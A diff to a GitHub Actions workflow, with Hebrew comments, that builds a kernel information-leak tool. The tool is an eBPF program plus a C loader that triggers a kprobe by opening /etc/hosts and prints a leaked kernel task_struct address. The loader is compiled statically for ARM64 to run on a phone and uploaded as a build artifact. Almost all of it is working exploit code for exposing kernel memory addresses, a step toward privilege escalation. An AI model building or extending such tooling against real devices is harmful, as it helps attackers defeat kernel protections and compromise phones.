@@ -11,9 +11,9 @@ jobs:
       - name: Install dependencies
         run: |
           sudo apt-get update
-          sudo apt-get install -y clang llvm libbpf-dev libelf-dev zlib1g-dev gcc-aarch64-linux-gnu
+          sudo apt-get install -y clang llvm libbpf-dev libelf-dev zlib1g-dev bpftool gcc-aarch64-linux-gnu
 
-      - name: Build eBPF
+      - name: Build eBPF and Loader
         run: |
           cat << 'EOF' > leak.bpf.c
           #include <linux/bpf.h>
@@ -36,13 +36,53 @@ jobs:
           char _license[] SEC("license") = "GPL";
           EOF
           
-          # הוספת נתיב ה-headers של x86_64
+          # קומפילציה של ה-eBPF
           clang -target bpf -O2 -g -I/usr/include/x86_64-linux-gnu -c leak.bpf.c -o leak.bpf.o
           
-          echo "Build process complete."
+          # יצירת קובץ סקלטון אוטומטי
+          bpftool gen skeleton leak.bpf.o > leak.skel.h
+          
+          # קוד ה-Loader
+          cat << 'EOF' > leak.c
+          #include <stdio.h>
+          #include <unistd.h>
+          #include "leak.skel.h"
 
-      - name: Upload eBPF object
+          int main() {
+              struct leak_bpf *skel;
+              int err;
+
+              skel = leak_bpf__open();
+              if (!skel) { fprintf(stderr, "Failed to open BPF skeleton\n"); return 1; }
+
+              err = leak_bpf__load(skel);
+              if (err) { fprintf(stderr, "Failed to load BPF skeleton\n"); return 1; }
+
+              err = leak_bpf__attach(skel);
+              if (err) { fprintf(stderr, "Failed to attach BPF skeleton\n"); return 1; }
+
+              // הפעלת ה-kprobe
+              FILE *f = fopen("/etc/hosts", "r");
+              if (f) fclose(f);
+
+              // קריאת התוצאה
+              __u32 key = 0;
+              __u64 value = 0;
+              int map_fd = bpf_map__fd(skel->maps.leak_map);
+              bpf_map_lookup_elem(map_fd, &key, &value);
+
+              printf("Leaked task_struct: 0x%llx\n", value);
+
+              leak_bpf__destroy(skel);
+              return 0;
+          }
+          EOF
+          
+          # קומפילציה סטטית ל-ARM64 (כדי שירוץ על הטלפון)
+          aarch64-linux-gnu-gcc -static leak.c -o leak -lbpf -lelf -lz
+
+      - name: Upload leak binary
         uses: actions/upload-artifact@v4
         with:
           name: ebpf-leak
-          path: leak.bpf.o
+          path: leak
